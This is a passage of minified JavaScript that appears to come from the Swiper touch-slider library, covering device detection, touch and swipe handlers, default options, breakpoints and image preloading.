              desktop: !1,
              iphone: !1,
              ipod: !1,
              ipad: !1,
              edge: !1,
              ie: !1,
              firefox: !1,
              macos: !1,
              windows: !1,
              cordova: !(!o.cordova && !o.phonegap),
              phonegap: !(!o.cordova && !o.phonegap),
              electron: !1,
            },
            i = o.screen.width,
            a = o.screen.height,
            n = t.match(/(Android);?[\s\/]+([\d.]+)?/);
          let r = t.match(/(iPad).*OS\s([\d_]+)/);
          const l = t.match(/(iPod)(.*OS\s([\d_]+))?/),
            d = !r && t.match(/(iPhone\sOS|iOS)\s([\d_]+)/),
            c = t.indexOf("MSIE ") >= 0 || t.indexOf("Trident/") >= 0,
            p = t.indexOf("Edge/") >= 0,
            h = t.indexOf("Gecko/") >= 0 && t.indexOf("Firefox/") >= 0,
            m = "Win32" === e,
            g = t.toLowerCase().indexOf("electron") >= 0;
          let f = "MacIntel" === e;
          return (
            !r &&
              f &&
              u.touch &&
              ((1024 === i && 1366 === a) ||
                (834 === i && 1194 === a) ||
                (834 === i && 1112 === a) ||
                (768 === i && 1024 === a)) &&
              ((r = t.match(/(Version)\/([\d.]+)/)), (f = !1)),
            (s.ie = c),
            (s.edge = p),
            (s.firefox = h),
            n &&
              !m &&
              ((s.os = "android"),
              (s.osVersion = n[2]),
              (s.android = !0),
              (s.androidChrome = t.toLowerCase().indexOf("chrome") >= 0)),
            (r || d || l) && ((s.os = "ios"), (s.ios = !0)),
            d &&
              !l &&
              ((s.osVersion = d[2].replace(/_/g, ".")), (s.iphone = !0)),
            r && ((s.osVersion = r[2].replace(/_/g, ".")), (s.ipad = !0)),
            l &&
              ((s.osVersion = l[3] ? l[3].replace(/_/g, ".") : null),
              (s.ipod = !0)),
            s.ios &&
              s.osVersion &&
              t.indexOf("Version/") >= 0 &&
              "10" === s.osVersion.split(".")[0] &&
              (s.osVersion = t
                .toLowerCase()
                .split("version/")[1]
                .split(" ")[0]),
            (s.webView =
              !(
                !(d || r || l) ||
                (!t.match(/.*AppleWebKit(?!.*Safari)/i) &&
                  !o.navigator.standalone)
              ) ||
              (o.matchMedia &&
                o.matchMedia("(display-mode: standalone)").matches)),
            (s.webview = s.webView),
            (s.standalone = s.webView),
            (s.desktop = !(s.ios || s.android) || g),
            s.desktop &&
              ((s.electron = g),
              (s.macos = f),
              (s.windows = m),
              s.macos && (s.os = "macos"),
              s.windows && (s.os = "windows")),
            (s.pixelRatio = o.devicePixelRatio || 1),
            s
          );
        })();
        function T(e) {
          const t = this,
            s = t.touchEventsData,
            { params: i, touches: a } = t;
          if (t.animating && i.preventInteractionOnTransition) return;
          let r = e;
          r.originalEvent && (r = r.originalEvent);
          const l = d(r.target);
          if (
            "wrapper" === i.touchEventsTarget &&
            !l.closest(t.wrapperEl).length
          )
            return;
          if (
            ((s.isTouchEvent = "touchstart" === r.type),
            !s.isTouchEvent && "which" in r && 3 === r.which)
          )
            return;
          if (!s.isTouchEvent && "button" in r && r.button > 0) return;
          if (s.isTouched && s.isMoved) return;
          if (
            i.noSwiping &&
            l.closest(
              i.noSwipingSelector ? i.noSwipingSelector : `.${i.noSwipingClass}`
            )[0]
          )
            return void (t.allowClick = !0);
          if (i.swipeHandler && !l.closest(i.swipeHandler)[0]) return;
          (a.currentX =
            "touchstart" === r.type ? r.targetTouches[0].pageX : r.pageX),
            (a.currentY =
              "touchstart" === r.type ? r.targetTouches[0].pageY : r.pageY);
          const c = a.currentX,
            p = a.currentY,
            u = i.edgeSwipeDetection || i.iOSEdgeSwipeDetection,
            m = i.edgeSwipeThreshold || i.iOSEdgeSwipeThreshold;
          if (!u || !(c <= m || c >= o.screen.width - m)) {
            if (
              (h.extend(s, {
                isTouched: !0,
                isMoved: !1,
                allowTouchCallbacks: !0,
                isScrolling: void 0,
                startMoving: void 0,
              }),
              (a.startX = c),
              (a.startY = p),
              (s.touchStartTime = h.now()),
              (t.allowClick = !0),
              t.updateSize(),
              (t.swipeDirection = void 0),
              i.threshold > 0 && (s.allowThresholdMove = !1),
              "touchstart" !== r.type)
            ) {
              let e = !0;
              l.is(s.formElements) && (e = !1),
                n.activeElement &&
                  d(n.activeElement).is(s.formElements) &&
                  n.activeElement !== l[0] &&
                  n.activeElement.blur();
              const a = e && t.allowTouchMove && i.touchStartPreventDefault;
              (i.touchStartForcePreventDefault || a) && r.preventDefault();
            }
            t.emit("touchStart", r);
          }
        }
        function C(e) {
          const t = this,
            s = t.touchEventsData,
            { params: i, touches: a, rtlTranslate: r } = t;
          let o = e;
          if ((o.originalEvent && (o = o.originalEvent), !s.isTouched))
            return void (
              s.startMoving &&
              s.isScrolling &&
              t.emit("touchMoveOpposite", o)
            );
          if (s.isTouchEvent && "touchmove" !== o.type) return;
          const l =
              "touchmove" === o.type &&
              o.targetTouches &&
              (o.targetTouches[0] || o.changedTouches[0]),
            c = "touchmove" === o.type ? l.pageX : o.pageX,
            p = "touchmove" === o.type ? l.pageY : o.pageY;
          if (o.preventedByNestedSwiper)
            return (a.startX = c), void (a.startY = p);
          if (!t.allowTouchMove)
            return (
              (t.allowClick = !1),
              void (
                s.isTouched &&
                (h.extend(a, {
                  startX: c,
                  startY: p,
                  currentX: c,
                  currentY: p,
                }),
                (s.touchStartTime = h.now()))
              )
            );
          if (s.isTouchEvent && i.touchReleaseOnEdges && !i.loop)
            if (t.isVertical()) {
              if (
                (p < a.startY && t.translate <= t.maxTranslate()) ||
                (p > a.startY && t.translate >= t.minTranslate())
              )
                return (s.isTouched = !1), void (s.isMoved = !1);
            } else if (
              (c < a.startX && t.translate <= t.maxTranslate()) ||
              (c > a.startX && t.translate >= t.minTranslate())
            )
              return;
          if (
            s.isTouchEvent &&
            n.activeElement &&
            o.target === n.activeElement &&
            d(o.target).is(s.formElements)
          )
            return (s.isMoved = !0), void (t.allowClick = !1);
          if (
            (s.allowTouchCallbacks && t.emit("touchMove", o),
            o.targetTouches && o.targetTouches.length > 1)
          )
            return;
          (a.currentX = c), (a.currentY = p);
          const u = a.currentX - a.startX,
            m = a.currentY - a.startY;
          if (
            t.params.threshold &&
            Math.sqrt(u ** 2 + m ** 2) < t.params.threshold
          )
            return;
          if (void 0 === s.isScrolling) {
            let e;
            (t.isHorizontal() && a.currentY === a.startY) ||
            (t.isVertical() && a.currentX === a.startX)
              ? (s.isScrolling = !1)
              : u * u + m * m >= 25 &&
                ((e = (180 * Math.atan2(Math.abs(m), Math.abs(u))) / Math.PI),
                (s.isScrolling = t.isHorizontal()
                  ? e > i.touchAngle
                  : 90 - e > i.touchAngle));
          }
          if (
            (s.isScrolling && t.emit("touchMoveOpposite", o),
            void 0 === s.startMoving &&
              ((a.currentX === a.startX && a.currentY === a.startY) ||
                (s.startMoving = !0)),
            s.isScrolling)
          )
            return void (s.isTouched = !1);
          if (!s.startMoving) return;
          (t.allowClick = !1),
            !i.cssMode && o.cancelable && o.preventDefault(),
            i.touchMoveStopPropagation && !i.nested && o.stopPropagation(),
            s.isMoved ||
              (i.loop && t.loopFix(),
              (s.startTranslate = t.getTranslate()),
              t.setTransition(0),
              t.animating &&
                t.$wrapperEl.trigger("webkitTransitionEnd transitionend"),
              (s.allowMomentumBounce = !1),
              !i.grabCursor ||
                (!0 !== t.allowSlideNext && !0 !== t.allowSlidePrev) ||
                t.setGrabCursor(!0),
              t.emit("sliderFirstMove", o)),
            t.emit("sliderMove", o),
            (s.isMoved = !0);
          let g = t.isHorizontal() ? u : m;
          (a.diff = g),
            (g *= i.touchRatio),
            r && (g = -g),
            (t.swipeDirection = g > 0 ? "prev" : "next"),
            (s.currentTranslate = g + s.startTranslate);
          let f = !0,
            v = i.resistanceRatio;
          if (
            (i.touchReleaseOnEdges && (v = 0),
            g > 0 && s.currentTranslate > t.minTranslate()
              ? ((f = !1),
                i.resistance &&
                  (s.currentTranslate =
                    t.minTranslate() -
                    1 +
                    (-t.minTranslate() + s.startTranslate + g) ** v))
              : g < 0 &&
                s.currentTranslate < t.maxTranslate() &&
                ((f = !1),
                i.resistance &&
                  (s.currentTranslate =
                    t.maxTranslate() +
                    1 -
                    (t.maxTranslate() - s.startTranslate - g) ** v)),
            f && (o.preventedByNestedSwiper = !0),
            !t.allowSlideNext &&
              "next" === t.swipeDirection &&
              s.currentTranslate < s.startTranslate &&
              (s.currentTranslate = s.startTranslate),
            !t.allowSlidePrev &&
              "prev" === t.swipeDirection &&
              s.currentTranslate > s.startTranslate &&
              (s.currentTranslate = s.startTranslate),
            i.threshold > 0)
          ) {
            if (!(Math.abs(g) > i.threshold || s.allowThresholdMove))
              return void (s.currentTranslate = s.startTranslate);
            if (!s.allowThresholdMove)
              return (
                (s.allowThresholdMove = !0),
                (a.startX = a.currentX),
                (a.startY = a.currentY),
                (s.currentTranslate = s.startTranslate),
                void (a.diff = t.isHorizontal()
                  ? a.currentX - a.startX
                  : a.currentY - a.startY)
              );
          }
          i.followFinger &&
            !i.cssMode &&
            ((i.freeMode || i.watchSlidesProgress || i.watchSlidesVisibility) &&
              (t.updateActiveIndex(), t.updateSlidesClasses()),
            i.freeMode &&
              (0 === s.velocities.length &&
                s.velocities.push({
                  position: a[t.isHorizontal() ? "startX" : "startY"],
                  time: s.touchStartTime,
                }),
              s.velocities.push({
                position: a[t.isHorizontal() ? "currentX" : "currentY"],
                time: h.now(),
              })),
            t.updateProgress(s.currentTranslate),
            t.setTranslate(s.currentTranslate));
        }
        function E(e) {
          const t = this,
            s = t.touchEventsData,
            {
              params: i,
              touches: a,
              rtlTranslate: n,
              $wrapperEl: r,
              slidesGrid: o,
              snapGrid: l,
            } = t;
          let d = e;
          if (
            (d.originalEvent && (d = d.originalEvent),
            s.allowTouchCallbacks && t.emit("touchEnd", d),
            (s.allowTouchCallbacks = !1),
            !s.isTouched)
          )
            return (
              s.isMoved && i.grabCursor && t.setGrabCursor(!1),
              (s.isMoved = !1),
              void (s.startMoving = !1)
            );
          i.grabCursor &&
            s.isMoved &&
            s.isTouched &&
            (!0 === t.allowSlideNext || !0 === t.allowSlidePrev) &&
            t.setGrabCursor(!1);
          const c = h.now(),
            p = c - s.touchStartTime;
          if (
            (t.allowClick &&
              (t.updateClickedSlide(d),
              t.emit("tap click", d),
              p < 300 &&
                c - s.lastClickTime < 300 &&
                t.emit("doubleTap doubleClick", d)),
            (s.lastClickTime = h.now()),
            h.nextTick(() => {
              t.destroyed || (t.allowClick = !0);
            }),
            !s.isTouched ||
              !s.isMoved ||
              !t.swipeDirection ||
              0 === a.diff ||
              s.currentTranslate === s.startTranslate)
          )
            return (
              (s.isTouched = !1), (s.isMoved = !1), void (s.startMoving = !1)
            );
          let u;
          if (
            ((s.isTouched = !1),
            (s.isMoved = !1),
            (s.startMoving = !1),
            (u = i.followFinger
              ? n
                ? t.translate
                : -t.translate
              : -s.currentTranslate),
            i.cssMode)
          )
            return;
          if (i.freeMode) {
            if (u < -t.minTranslate()) return void t.slideTo(t.activeIndex);
            if (u > -t.maxTranslate())
              return void (t.slides.length < l.length
                ? t.slideTo(l.length - 1)
                : t.slideTo(t.slides.length - 1));
            if (i.freeModeMomentum) {
              if (s.velocities.length > 1) {
                const e = s.velocities.pop(),
                  a = s.velocities.pop(),
                  n = e.position - a.position,
                  r = e.time - a.time;
                (t.velocity = n / r),
                  (t.velocity /= 2),
                  Math.abs(t.velocity) < i.freeModeMinimumVelocity &&
                    (t.velocity = 0),
                  (r > 150 || h.now() - e.time > 300) && (t.velocity = 0);
              } else t.velocity = 0;
              (t.velocity *= i.freeModeMomentumVelocityRatio),
                (s.velocities.length = 0);
              let e = 1e3 * i.freeModeMomentumRatio;
              const a = t.velocity * e;
              let o = t.translate + a;
              n && (o = -o);
              let d,
                c = !1;
              const p =
                20 * Math.abs(t.velocity) * i.freeModeMomentumBounceRatio;
              let u;
              if (o < t.maxTranslate())
                i.freeModeMomentumBounce
                  ? (o + t.maxTranslate() < -p && (o = t.maxTranslate() - p),
                    (d = t.maxTranslate()),
                    (c = !0),
                    (s.allowMomentumBounce = !0))
                  : (o = t.maxTranslate()),
                  i.loop && i.centeredSlides && (u = !0);
              else if (o > t.minTranslate())
                i.freeModeMomentumBounce
                  ? (o - t.minTranslate() > p && (o = t.minTranslate() + p),
                    (d = t.minTranslate()),
                    (c = !0),
                    (s.allowMomentumBounce = !0))
                  : (o = t.minTranslate()),
                  i.loop && i.centeredSlides && (u = !0);
              else if (i.freeModeSticky) {
                let e;
                for (let t = 0; t < l.length; t += 1)
                  if (l[t] > -o) {
                    e = t;
                    break;
                  }
                (o =
                  Math.abs(l[e] - o) < Math.abs(l[e - 1] - o) ||
                  "next" === t.swipeDirection
                    ? l[e]
                    : l[e - 1]),
                  (o = -o);
              }
              if (
                (u &&
                  t.once("transitionEnd", () => {
                    t.loopFix();
                  }),
                0 !== t.velocity)
              ) {
                if (
                  ((e = n
                    ? Math.abs((-o - t.translate) / t.velocity)
                    : Math.abs((o - t.translate) / t.velocity)),
                  i.freeModeSticky)
                ) {
                  const s = Math.abs((n ? -o : o) - t.translate),
                    a = t.slidesSizesGrid[t.activeIndex];
                  e =
                    s < a ? i.speed : s < 2 * a ? 1.5 * i.speed : 2.5 * i.speed;
                }
              } else if (i.freeModeSticky) return void t.slideToClosest();
              i.freeModeMomentumBounce && c
                ? (t.updateProgress(d),
                  t.setTransition(e),
                  t.setTranslate(o),
                  t.transitionStart(!0, t.swipeDirection),
                  (t.animating = !0),
                  r.transitionEnd(() => {
                    t &&
                      !t.destroyed &&
                      s.allowMomentumBounce &&
                      (t.emit("momentumBounce"),
                      t.setTransition(i.speed),
                      setTimeout(() => {
                        t.setTranslate(d),
                          r.transitionEnd(() => {
                            t && !t.destroyed && t.transitionEnd();
                          });
                      }, 0));
                  }))
                : t.velocity
                ? (t.updateProgress(o),
                  t.setTransition(e),
                  t.setTranslate(o),
                  t.transitionStart(!0, t.swipeDirection),
                  t.animating ||
                    ((t.animating = !0),
                    r.transitionEnd(() => {
                      t && !t.destroyed && t.transitionEnd();
                    })))
                : t.updateProgress(o),
                t.updateActiveIndex(),
                t.updateSlidesClasses();
            } else if (i.freeModeSticky) return void t.slideToClosest();
            return void (
              (!i.freeModeMomentum || p >= i.longSwipesMs) &&
              (t.updateProgress(),
              t.updateActiveIndex(),
              t.updateSlidesClasses())
            );
          }
          let m = 0,
            g = t.slidesSizesGrid[0];
          for (
            let e = 0;
            e < o.length;
            e += e < i.slidesPerGroupSkip ? 1 : i.slidesPerGroup
          ) {
            const t = e < i.slidesPerGroupSkip - 1 ? 1 : i.slidesPerGroup;
            void 0 !== o[e + t]
              ? u >= o[e] && u < o[e + t] && ((m = e), (g = o[e + t] - o[e]))
              : u >= o[e] && ((m = e), (g = o[o.length - 1] - o[o.length - 2]));
          }
          const f = (u - o[m]) / g,
            v = m < i.slidesPerGroupSkip - 1 ? 1 : i.slidesPerGroup;
          if (p > i.longSwipesMs) {
            if (!i.longSwipes) return void t.slideTo(t.activeIndex);
            "next" === t.swipeDirection &&
              (f >= i.longSwipesRatio ? t.slideTo(m + v) : t.slideTo(m)),
              "prev" === t.swipeDirection &&
                (f > 1 - i.longSwipesRatio ? t.slideTo(m + v) : t.slideTo(m));
          } else {
            if (!i.shortSwipes) return void t.slideTo(t.activeIndex);
            !t.navigation ||
            (d.target !== t.navigation.nextEl &&
              d.target !== t.navigation.prevEl)
              ? ("next" === t.swipeDirection && t.slideTo(m + v),
                "prev" === t.swipeDirection && t.slideTo(m))
              : d.target === t.navigation.nextEl
              ? t.slideTo(m + v)
              : t.slideTo(m);
          }
        }
        function S() {
          const e = this,
            { params: t, el: s } = e;
          if (s && 0 === s.offsetWidth) return;
          t.breakpoints && e.setBreakpoint();
          const { allowSlideNext: i, allowSlidePrev: a, snapGrid: n } = e;
          (e.allowSlideNext = !0),
            (e.allowSlidePrev = !0),
            e.updateSize(),
            e.updateSlides(),
            e.updateSlidesClasses(),
            ("auto" === t.slidesPerView || t.slidesPerView > 1) &&
            e.isEnd &&
            !e.isBeginning &&
            !e.params.centeredSlides
              ? e.slideTo(e.slides.length - 1, 0, !1, !0)
              : e.slideTo(e.activeIndex, 0, !1, !0),
            e.autoplay &&
              e.autoplay.running &&
              e.autoplay.paused &&
              e.autoplay.run(),
            (e.allowSlidePrev = a),
            (e.allowSlideNext = i),
            e.params.watchOverflow && n !== e.snapGrid && e.checkOverflow();
        }
        function $(e) {
          const t = this;
          t.allowClick ||
            (t.params.preventClicks && e.preventDefault(),
            t.params.preventClicksPropagation &&
              t.animating &&
              (e.stopPropagation(), e.stopImmediatePropagation()));
        }
        function M() {
          const e = this,
            { wrapperEl: t, rtlTranslate: s } = e;
          let i;
          (e.previousTranslate = e.translate),
            e.isHorizontal()
              ? (e.translate = s
                  ? t.scrollWidth - t.offsetWidth - t.scrollLeft
                  : -t.scrollLeft)
              : (e.translate = -t.scrollTop),
            -0 === e.translate && (e.translate = 0),
            e.updateActiveIndex(),
            e.updateSlidesClasses();
          const a = e.maxTranslate() - e.minTranslate();
          (i = 0 === a ? 0 : (e.translate - e.minTranslate()) / a),
            i !== e.progress &&
              e.updateProgress(s ? -e.translate : e.translate),
            e.emit("setTranslate", e.translate, !1);
        }
        let I = !1;
        function z() {}
        var k = {
          init: !0,
          direction: "horizontal",
          touchEventsTarget: "container",
          initialSlide: 0,
          speed: 300,
          cssMode: !1,
          updateOnWindowResize: !0,
          preventInteractionOnTransition: !1,
          edgeSwipeDetection: !1,
          edgeSwipeThreshold: 20,
          freeMode: !1,
          freeModeMomentum: !0,
          freeModeMomentumRatio: 1,
          freeModeMomentumBounce: !0,
          freeModeMomentumBounceRatio: 1,
          freeModeMomentumVelocityRatio: 1,
          freeModeSticky: !1,
          freeModeMinimumVelocity: 0.02,
          autoHeight: !1,
          setWrapperSize: !1,
          virtualTranslate: !1,
          effect: "slide",
          breakpoints: void 0,
          spaceBetween: 0,
          slidesPerView: 1,
          slidesPerColumn: 1,
          slidesPerColumnFill: "column",
          slidesPerGroup: 1,
          slidesPerGroupSkip: 0,
          centeredSlides: !1,
          centeredSlidesBounds: !1,
          slidesOffsetBefore: 0,
          slidesOffsetAfter: 0,
          normalizeSlideIndex: !0,
          centerInsufficientSlides: !1,
          watchOverflow: !1,
          roundLengths: !1,
          touchRatio: 1,
          touchAngle: 45,
          simulateTouch: !0,
          shortSwipes: !0,
          longSwipes: !0,
          longSwipesRatio: 0.5,
          longSwipesMs: 300,
          followFinger: !0,
          allowTouchMove: !0,
          threshold: 0,
          touchMoveStopPropagation: !1,
          touchStartPreventDefault: !0,
          touchStartForcePreventDefault: !1,
          touchReleaseOnEdges: !1,
          uniqueNavElements: !0,
          resistance: !0,
          resistanceRatio: 0.85,
          watchSlidesProgress: !1,
          watchSlidesVisibility: !1,
          grabCursor: !1,
          preventClicks: !0,
          preventClicksPropagation: !0,
          slideToClickedSlide: !1,
          preloadImages: !0,
          updateOnImagesReady: !0,
          loop: !1,
          loopAdditionalSlides: 0,
          loopedSlides: null,
          loopFillGroupWithBlank: !1,
          allowSlidePrev: !0,
          allowSlideNext: !0,
          swipeHandler: null,
          noSwiping: !0,
          noSwipingClass: "swiper-no-swiping",
          noSwipingSelector: null,
          passiveListeners: !0,
          containerModifierClass: "swiper-container-",
          slideClass: "swiper-slide",
          slideBlankClass: "swiper-slide-invisible-blank",
          slideActiveClass: "swiper-slide-active",
          slideDuplicateActiveClass: "swiper-slide-duplicate-active",
          slideVisibleClass: "swiper-slide-visible",
          slideDuplicateClass: "swiper-slide-duplicate",
          slideNextClass: "swiper-slide-next",
          slideDuplicateNextClass: "swiper-slide-duplicate-next",
          slidePrevClass: "swiper-slide-prev",
          slideDuplicatePrevClass: "swiper-slide-duplicate-prev",
          wrapperClass: "swiper-wrapper",
          runCallbacksOnInit: !0,
        };
        const L = {
            update: g,
            translate: f,
            transition: {
              setTransition: function (e, t) {
                const s = this;
                s.params.cssMode || s.$wrapperEl.transition(e),
                  s.emit("setTransition", e, t);
              },
              transitionStart: function (e = !0, t) {
                const s = this,
                  { activeIndex: i, params: a, previousIndex: n } = s;
                if (a.cssMode) return;
                a.autoHeight && s.updateAutoHeight();
                let r = t;
                if (
                  (r || (r = i > n ? "next" : i < n ? "prev" : "reset"),
                  s.emit("transitionStart"),
                  e && i !== n)
                ) {
                  if ("reset" === r)
                    return void s.emit("slideResetTransitionStart");
                  s.emit("slideChangeTransitionStart"),
                    "next" === r
                      ? s.emit("slideNextTransitionStart")
                      : s.emit("slidePrevTransitionStart");
                }
              },
              transitionEnd: function (e = !0, t) {
                const s = this,
                  { activeIndex: i, previousIndex: a, params: n } = s;
                if (((s.animating = !1), n.cssMode)) return;
                s.setTransition(0);
                let r = t;
                if (
                  (r || (r = i > a ? "next" : i < a ? "prev" : "reset"),
                  s.emit("transitionEnd"),
                  e && i !== a)
                ) {
                  if ("reset" === r)
                    return void s.emit("slideResetTransitionEnd");
                  s.emit("slideChangeTransitionEnd"),
                    "next" === r
                      ? s.emit("slideNextTransitionEnd")
                      : s.emit("slidePrevTransitionEnd");
                }
              },
            },
            slide: v,
            loop: y,
            grabCursor: b,
            manipulation: w,
            events: {
              attachEvents: function () {
                const e = this,
                  { params: t, touchEvents: s, el: i, wrapperEl: a } = e;
                (e.onTouchStart = T.bind(e)),
                  (e.onTouchMove = C.bind(e)),
                  (e.onTouchEnd = E.bind(e)),
                  t.cssMode && (e.onScroll = M.bind(e)),
                  (e.onClick = $.bind(e));
                const r = !!t.nested;
                if (!u.touch && u.pointerEvents)
                  i.addEventListener(s.start, e.onTouchStart, !1),
                    n.addEventListener(s.move, e.onTouchMove, r),
                    n.addEventListener(s.end, e.onTouchEnd, !1);
                else {
                  if (u.touch) {
                    const a = !(
                      "touchstart" !== s.start ||
                      !u.passiveListener ||
                      !t.passiveListeners
                    ) && { passive: !0, capture: !1 };
                    i.addEventListener(s.start, e.onTouchStart, a),
                      i.addEventListener(
                        s.move,
                        e.onTouchMove,
                        u.passiveListener ? { passive: !1, capture: r } : r
                      ),
                      i.addEventListener(s.end, e.onTouchEnd, a),
                      s.cancel && i.addEventListener(s.cancel, e.onTouchEnd, a),
                      I || (n.addEventListener("touchstart", z), (I = !0));
                  }
                  ((t.simulateTouch && !x.ios && !x.android) ||
                    (t.simulateTouch && !u.touch && x.ios)) &&
                    (i.addEventListener("mousedown", e.onTouchStart, !1),
                    n.addEventListener("mousemove", e.onTouchMove, r),
                    n.addEventListener("mouseup", e.onTouchEnd, !1));
                }
                (t.preventClicks || t.preventClicksPropagation) &&
                  i.addEventListener("click", e.onClick, !0),
                  t.cssMode && a.addEventListener("scroll", e.onScroll),
                  t.updateOnWindowResize
                    ? e.on(
                        x.ios || x.android
                          ? "resize orientationchange observerUpdate"
                          : "resize observerUpdate",
                        S,
                        !0
                      )
                    : e.on("observerUpdate", S, !0);
              },
              detachEvents: function () {
                const e = this,
                  { params: t, touchEvents: s, el: i, wrapperEl: a } = e,
                  r = !!t.nested;
                if (!u.touch && u.pointerEvents)
                  i.removeEventListener(s.start, e.onTouchStart, !1),
                    n.removeEventListener(s.move, e.onTouchMove, r),
                    n.removeEventListener(s.end, e.onTouchEnd, !1);
                else {
                  if (u.touch) {
                    const a = !(
                      "onTouchStart" !== s.start ||
                      !u.passiveListener ||
                      !t.passiveListeners
                    ) && { passive: !0, capture: !1 };
                    i.removeEventListener(s.start, e.onTouchStart, a),
                      i.removeEventListener(s.move, e.onTouchMove, r),
                      i.removeEventListener(s.end, e.onTouchEnd, a),
                      s.cancel &&
                        i.removeEventListener(s.cancel, e.onTouchEnd, a);
                  }
                  ((t.simulateTouch && !x.ios && !x.android) ||
                    (t.simulateTouch && !u.touch && x.ios)) &&
                    (i.removeEventListener("mousedown", e.onTouchStart, !1),
                    n.removeEventListener("mousemove", e.onTouchMove, r),
                    n.removeEventListener("mouseup", e.onTouchEnd, !1));
                }
                (t.preventClicks || t.preventClicksPropagation) &&
                  i.removeEventListener("click", e.onClick, !0),
                  t.cssMode && a.removeEventListener("scroll", e.onScroll),
                  e.off(
                    x.ios || x.android
                      ? "resize orientationchange observerUpdate"
                      : "resize observerUpdate",
                    S
                  );
              },
            },
            breakpoints: {
              setBreakpoint: function () {
                const e = this,
                  {
                    activeIndex: t,
                    initialized: s,
                    loopedSlides: i = 0,
                    params: a,
                    $el: n,
                  } = e,
                  r = a.breakpoints;
                if (!r || (r && 0 === Object.keys(r).length)) return;
                const o = e.getBreakpoint(r);
                if (o && e.currentBreakpoint !== o) {
                  const l = o in r ? r[o] : void 0;
                  l &&
                    [
                      "slidesPerView",
                      "spaceBetween",
                      "slidesPerGroup",
                      "slidesPerGroupSkip",
                      "slidesPerColumn",
                    ].forEach((e) => {
                      const t = l[e];
                      void 0 !== t &&
                        (l[e] =
                          "slidesPerView" !== e ||
                          ("AUTO" !== t && "auto" !== t)
                            ? "slidesPerView" === e
                              ? parseFloat(t)
                              : parseInt(t, 10)
                            : "auto");
                    });
                  const d = l || e.originalParams,
                    c = a.slidesPerColumn > 1,
                    p = d.slidesPerColumn > 1;
                  c && !p
                    ? n.removeClass(
                        `${a.containerModifierClass}multirow ${a.containerModifierClass}multirow-column`
                      )
                    : !c &&
                      p &&
                      (n.addClass(`${a.containerModifierClass}multirow`),
                      "column" === d.slidesPerColumnFill &&
                        n.addClass(
                          `${a.containerModifierClass}multirow-column`
                        ));
                  const u = d.direction && d.direction !== a.direction,
                    m = a.loop && (d.slidesPerView !== a.slidesPerView || u);
                  u && s && e.changeDirection(),
                    h.extend(e.params, d),
                    h.extend(e, {
                      allowTouchMove: e.params.allowTouchMove,
                      allowSlideNext: e.params.allowSlideNext,
                      allowSlidePrev: e.params.allowSlidePrev,
                    }),
                    (e.currentBreakpoint = o),
                    m &&
                      s &&
                      (e.loopDestroy(),
                      e.loopCreate(),
                      e.updateSlides(),
                      e.slideTo(t - i + e.loopedSlides, 0, !1)),
                    e.emit("breakpoint", d);
                }
              },
              getBreakpoint: function (e) {
                if (!e) return;
                let t = !1;
                const s = Object.keys(e).map((e) => {
                  if ("string" == typeof e && 0 === e.indexOf("@")) {
                    const t = parseFloat(e.substr(1));
                    return { value: o.innerHeight * t, point: e };
                  }
                  return { value: e, point: e };
                });
                s.sort((e, t) => parseInt(e.value, 10) - parseInt(t.value, 10));
                for (let e = 0; e < s.length; e += 1) {
                  const { point: i, value: a } = s[e];
                  a <= o.innerWidth && (t = i);
                }
                return t || "max";
              },
            },
            checkOverflow: {
              checkOverflow: function () {
                const e = this,
                  t = e.params,
                  s = e.isLocked,
                  i =
                    e.slides.length > 0 &&
                    t.slidesOffsetBefore +
                      t.spaceBetween * (e.slides.length - 1) +
                      e.slides[0].offsetWidth * e.slides.length;
                t.slidesOffsetBefore && t.slidesOffsetAfter && i
                  ? (e.isLocked = i <= e.size)
                  : (e.isLocked = 1 === e.snapGrid.length),
                  (e.allowSlideNext = !e.isLocked),
                  (e.allowSlidePrev = !e.isLocked),
                  s !== e.isLocked && e.emit(e.isLocked ? "lock" : "unlock"),
                  s &&
                    s !== e.isLocked &&
                    ((e.isEnd = !1), e.navigation && e.navigation.update());
              },
            },
            classes: {
              addClasses: function () {
                const { classNames: e, params: t, rtl: s, $el: i } = this,
                  a = [];
                a.push("initialized"),
                  a.push(t.direction),
                  t.freeMode && a.push("free-mode"),
                  t.autoHeight && a.push("autoheight"),
                  s && a.push("rtl"),
                  t.slidesPerColumn > 1 &&
                    (a.push("multirow"),
                    "column" === t.slidesPerColumnFill &&
                      a.push("multirow-column")),
                  x.android && a.push("android"),
                  x.ios && a.push("ios"),
                  t.cssMode && a.push("css-mode"),
                  a.forEach((s) => {
                    e.push(t.containerModifierClass + s);
                  }),
                  i.addClass(e.join(" "));
              },
              removeClasses: function () {
                const { $el: e, classNames: t } = this;
                e.removeClass(t.join(" "));
              },
            },
            images: {
              loadImage: function (e, t, s, i, a, n) {
                let r;
                function l() {
                  n && n();
                }
                d(e).parent("picture")[0] || (e.complete && a)
                  ? l()
                  : t
                  ? ((r = new o.Image()),
                    (r.onload = l),
                    (r.onerror = l),
                    i && (r.sizes = i),
                    s && (r.srcset = s),
                    t && (r.src = t))
                  : l();
              },
              preloadImages: function () {
                const e = this;
                function t() {
                  null != e &&
                    e &&
                    !e.destroyed &&
                    (void 0 !== e.imagesLoaded && (e.imagesLoaded += 1),
                    e.imagesLoaded === e.imagesToLoad.length &&
                      (e.params.updateOnImagesReady && e.update(),
                      e.emit("imagesReady")));
                }
                e.imagesToLoad = e.$el.find("img");
                for (let s = 0; s < e.imagesToLoad.length; s += 1) {
                  const i = e.imagesToLoad[s];
                  e.loadImage(
                    i,
                    i.currentSrc || i.getAttribute("src"),
                    i.srcset || i.getAttribute("srcset"),
                    i.sizes || i.getAttribute("sizes"),
                    !0,
                    t
                  );
                }
              },
            },
          },
          P = {};
        class O extends m {
          constructor(...e) {
            let t, s;
            1 === e.length && e[0].constructor && e[0].constructor === Object
              ? (s = e[0])
              : ([t, s] = e),
              s || (s = {}),
              (s = h.extend({}, s)),
              t && !s.el && (s.el = t),
              super(s),
              Object.keys(L).forEach((e) => {
                Object.keys(L[e]).forEach((t) => {
                  O.prototype[t] || (O.prototype[t] = L[e][t]);
                });
              });
            const i = this;
            void 0 === i.modules && (i.modules = {}),
              Object.keys(i.modules).forEach((e) => {
                const t = i.modules[e];
                if (t.params) {
                  const e = Object.keys(t.params)[0],
                    i = t.params[e];
                  if ("object" != typeof i || null === i) return;
                  if (!(e in s) || !("enabled" in i)) return;
                  !0 === s[e] && (s[e] = { enabled: !0 }),
                    "object" != typeof s[e] ||
                      "enabled" in s[e] ||
                      (s[e].enabled = !0),
                    s[e] || (s[e] = { enabled: !1 });
                }
              });
            const a = h.extend({}, k);
            i.useModulesParams(a),
              (i.params = h.extend({}, a, P, s)),
